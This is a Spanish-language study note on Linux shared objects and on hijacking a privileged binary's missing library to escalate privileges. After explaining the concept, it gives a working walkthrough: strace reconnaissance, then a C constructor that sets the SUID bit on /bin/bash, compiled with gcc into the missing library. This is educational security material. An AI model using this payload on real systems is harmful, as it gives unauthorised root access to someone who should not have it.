# Shared Objects

En sistemas Unix y similares (Como Linux), los *Shared Objects* (*SO*) u *Objetos Compartidos* son archivos que contiene código ejecutable que puede ser compartido entre múltiples programas al mismo tiemp. Se utilizan principalmente para implementar bibliotecas dinámicas, que permiten que varias aplicaciones compartan el mismo código sin necesidad de incluirlo cada una en su propio ejecutable.

Estos objetos se cargan en tiempo de ejecución por el linker dinámico (Como `ld.so` en Linux), similar a las *Dynamic Link Libraries* de Windows (*DLLs*), esto nos da lugar a algunos ataques o abusos ([[Abusing Dynamic Modules]]), pero en este caso con *Shared Objects*. Esto permite que el código sea compartido entre múltiples procesos que lo necesitan.

---
# Exploit 

La *inyección de Shared Objects* en sistemas Unix/Linux, así como la inyección de módulos dinámicos en Windows (Ejemplo *DLL Injection*, *DLL Hijacking* ([[Abusing Dynamic Modules]])), tienen como objetivo la ejecución de código arbitrario en el contexto de un proceso privilegiado, lo que puede resultar en una **Privilege Scalation**. 

Mediante la inyección o el secuestro de estos módulos, un atacante puede introducir código malicioso que el sistema ejecutará con los privilegios del proceso comprometido.

Por ejemplo, supongamos que tenemos un binario (`/usr/bin/dobliuw`) el cual podemos ejecutar con privilegios adminsitrativos, algo que podríamos realizar es una simple visualización de procesos a bajo nivel que se ejecutan por detrás en este binario con el comando `strace` (Herramienta de depuración que se utiliza para interceptar y registrar las *system calls* y las señales que son realizadas por un proceso durante ejecución).

```bash
strace /usr/bin/dobliuw
```

Tras la ejecución de este comando, pondremos a correr el binario mencionado y funcionará como siempre, con la diferencia de que tendremos todas las llamadas al sistema y señales realizadas por detrás, por lo que podríamos visualizar algo como lo siguiente:

![[so_injection_example.png]]

En este caso, nos interesa aquellas alertas de `No such file or directory`, donde podemos ver los **Shared Objects** que intenta cargar el programa y no logra hacerlo por que no encuentra los mismos.

En este punto, podemos empezar a pensar en una *Shared Objects Injection* o *Shared Objects Hijacking*. Todo dependerá de los permisos de escriturá que podamos llegar a tener en dichos directorios donde se intentan cargar dichas "librerias". 

En caso de disponer de permisos de escritura, podríamos seguir [árticulos](https://www.exploit-db.com/papers/37606) que encontremos en internet que expliquen como lograr crear e inyectar estos objetos compartidos:

```bash
nano /home/.config/so_injection.c
```

- Contenido del archivo `so_injection.c`:

```C
#include<stdio.h>
#include<stdlib.h>

static void so_i() __attribute__((constructor));

void so_i() {
    system("chmod +s /bin/bash && echo 'SO Injection succesfully done :) > /tmp/privesc.log'");
}
```

Una vez creado el archivo **C**, deberemos utilizar este para, haciendo uso de compiladores como `gcc`, crear el *Shared Object* basado en este código que ejecutará a nivel de sistema la instrucción ingresada en tiempo de carga.

```bash
gcc -shared -o libcounter.so -fPIC so_injection.c
```

Una vez ejecutado este comando, habremos creado el *Shared Object* `libcounter.so` que visualizamos previamente con `strace` que se intentaba cargar de una ruta del sistema pero no existia, tras esta sucesión de comandos habremos creado una "*Malicious Shared Object*". Simplemente quedaría volver a ejecutar el binario inicial (Ejemplo dado `/usr/bin/dobliuw`) y cuando se intente cargar este objeto compartido, se logrará cargar y se ejecutará en tiempo de carga lo que previamente indicamos en el archivo **.c**, asignando así, por ejemplo, permisos SUID a la bash.